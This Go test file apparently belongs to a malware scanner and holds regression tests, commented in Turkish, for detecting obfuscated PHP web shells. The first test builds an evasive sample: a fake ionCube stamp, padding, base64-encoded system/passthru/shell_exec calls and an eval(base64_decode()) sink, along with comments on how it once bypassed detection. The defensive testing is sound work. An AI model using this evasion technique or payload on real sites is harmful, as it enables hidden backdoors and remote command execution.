package avmotor

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestKodlayiciAyniContextSinkYakalanir — HASIM DOĞRULAMA REGRESYONU.
// Saldırgan ionCube damgası + uzun düşük-yoğunluk önsöz (blob'u mid-file'a iter,
// blobBas>0) + base64 gövde + AYNI PHP context'inde (yeni <?php YOK) eval sink'i
// yazarak taramayı atlatmayı denedi ve eski kodda puan=0 aldı. blobSonu + tail
// taraması bu tam-context sink'i geri yakalamalı.
func TestKodlayiciAyniContextSinkYakalanir(t *testing.T) {
	m, _ := Yeni(TabanSet(), 0)
	// Önsöz 256 bayttan UZUN olmalı: aksi halde blobBas 0'a yuvarlanır ve escape
	// guard tüm dosyayı kurtarır (naif deneme zaten yakalanıyordu — asıl açık bu değil).
	padding := strings.Repeat(". ", 400) // ~800 bayt düşük-yoğunluk önsöz
	payload := base64.StdEncoding.EncodeToString([]byte("system($_GET['x']); passthru($_GET['y']); shell_exec($_POST['z']);"))
	blob := strings.Repeat(payload, 300) // base64-yoğun opak gövde
	icerik := "<?php //ICB0 82:0 /* " + padding + " */ $c='" + blob + "';eval(base64_decode($c));"
	yol := filepath.Join(t.TempDir(), "helper.php")
	if err := os.WriteFile(yol, []byte(icerik), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, tespit := m.TaraDosya(yol, "", nil); !tespit {
		t.Fatal("blob-sonrası aynı-context eval(base64_decode) sink'i YAKALANMALI (escape guard bypass regresyonu)")
	}
}

// TestKodlayiciGercekIoncubeHalaTemiz — negatif kontrol: blobSonu/tail eklemesi
// GERÇEK ionCube dosyasında (blob dosya sonuna kadar, sink YOK) FP üretmemeli.
func TestKodlayiciGercekIoncubeHalaTemiz(t *testing.T) {
	m, _ := Yeni(TabanSet(), 0)
	payload := base64.StdEncoding.EncodeToString([]byte("bu tamamen zararsız uygulama kodudur, sadece iş mantığı içerir 123456"))
	blob := strings.Repeat(payload, 400)
	icerik := "<?php //ICB0 82:0 83:e7bc ?><?php //00cba " + blob + " ?>"
	yol := filepath.Join(t.TempDir(), "temiz.php")
	if err := os.WriteFile(yol, []byte(icerik), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, tespit := m.TaraDosya(yol, "", nil); tespit {
		t.Fatal("gerçek ionCube dosyası (sink YOK) TEMİZ kalmalı — blobSonu/tail FP üretmemeli")
	}
}
